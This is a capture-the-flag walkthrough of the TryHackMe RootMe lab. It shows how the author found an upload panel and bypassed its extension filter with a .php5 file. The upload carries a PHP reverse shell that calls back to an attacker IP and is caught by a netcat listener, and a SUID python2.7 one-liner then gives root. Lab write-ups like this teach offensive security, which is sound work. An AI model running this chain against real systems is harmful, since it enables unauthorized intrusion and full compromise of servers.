# TryHackMe — RootMe

**Difficulty:** Easy **OS:** Linux **Target IP:** `10.48.185.49`

A beginner-friendly Linux box that chains a file upload vulnerability into a reverse shell, followed by privilege escalation to root.

![[Pasted image 20261002192620.png]]
---

## 1. Reconnaissance

### Nmap Scan

Started with a full TCP service scan:

```bash
nmap -sC -sV -Pn -T4 10.48.185.49
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
```

Two open ports:

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 (Ubuntu)|
|80|HTTP|Apache 2.4.41 (Ubuntu)|

Nothing jumps out from the SSH banner, so the HTTP service on port 80 is the obvious entry point. The page title "HackIT - Home" confirms there's a web app worth digging into.

![[Pasted image 20261002192650.png]]
	
### Directory Enumeration

Ran Gobuster against the web root to find hidden paths:

```bash
gobuster dir -u http://10.48.185.49 -w /home/rza/stuff/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```
/uploads              (Status: 301) [Size: 314] [--> http://10.48.185.49/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.48.185.49/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.48.185.49/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.48.185.49/panel/]
```

Two directories stand out immediately:

- **`/panel`** — likely an admin or login panel
- **`/uploads`** — likely where uploaded files are served from

The combination of an upload directory and a panel is a strong hint that `/panel` has a file upload feature, and anything uploaded there gets stored (and served) under `/uploads`.

---

## 2. Gaining a Foothold

### Uploading a PHP Reverse Shell

With access to the upload feature on `/panel`, the plan was to upload a PHP reverse shell and trigger it via `/uploads/`.

Used the well-known [pentestmonkey php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), editing the `$ip` and `$port` variables to point back to the attacking machine:

```php
$ip = '192.168.143.9';  // attacker IP
$port = 4444;           // listener port
```

Since uploading shell.php had errors because the website doesnt take .php files i changed the file to shell.php5 and that got uploaded without any problem.

![[Pasted image 20261002192807.png]]
### Catching the Shell

Started a `netcat` listener before triggering the upload:

```bash
nc -lvnp 4444
```

Once the uploaded shell was executed, the listener caught the connection:

```
Listening on 0.0.0.0 4444
Connection received on 10.48.185.49 39942
Linux ip-10-48-185-49 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:42:31 up  2:05,  0 users,  load average: 0.08, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Landed a shell as `www-data` — the Apache service account.

### Grabbing the User Flag

```bash
find / -name user.txt 2>/dev/null
```

```
/var/www/user.txt
```

```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

## 3. Privilege Escalation

### Enumerating SUID Binaries

A standard first check on any Linux box — look for binaries with the SUID bit set, since these run with the owner's permissions (often root) regardless of who executes them:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

The output was long, mostly standard system binaries (`/bin/mount`, `/bin/su`, `/usr/bin/sudo`, snap package binaries, etc.), but one entry stood out as non-standard for a stock Ubuntu install:

```
794694   3576 -rwsr-xr-x   1 root     root        3657904 Dec  9  2024 /usr/bin/python2.7
```

`python2.7` having the SUID bit set and owned by `root` is **not default behavior** on Ubuntu — this is a deliberately misconfigured binary, and it's a textbook privilege escalation vector: if a SUID binary can spawn a shell, that shell inherits the SUID binary's effective privileges (root, in this case).
### Exploiting the SUID Python Binary

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag tells `/bin/sh` to preserve privileges (not drop the effective UID to match the real UID), which is what makes this escalation work instead of silently dropping back to `www-data`.

Confirming the escalation:

```bash
id
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

The effective UID (`euid`) is now `0` — root — while the real UID stays `www-data`. This is exactly what the SUID bit does: the process runs with root's effective privileges.
### Grabbing the Root Flag

```bash
find / -name root.txt 2>/dev/null
```

```
/root/root.txt
```

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 4. Summary

|Stage|Technique|
|---|---|
|Recon|`nmap` + `gobuster` directory brute-force|
|Foothold|PHP reverse shell uploaded via `/panel`, served from `/uploads/`|
|User|Landed as `www-data` via netcat listener|
|Privesc|SUID-root `python2.7` binary → spawned a privilege-preserving shell (`sh -p`)|
|Root|Effective UID 0 confirmed via `id`, read `/root/root.txt`|

### Key Takeaways

- Unrestricted file upload functionality combined with a predictable/public uploads directory is a reliable path to remote code execution.
- SUID bits on interpreters like `python`, `perl`, or `php` are almost always exploitable for privilege escalation — they can execute arbitrary code with the binary's effective permissions. Checking [GTFOBins](https://gtfobins.github.io/) for SUID-flagged binaries is standard practice during enumeration.
- Always run a full SUID/SGID enumeration (`find / -perm -4000` / `-perm -2000`) early in post-exploitation — it's low-effort and frequently the fastest path to root on easy-rated boxes.

---

_Write-up by RZA._# TryHackMe — RootMe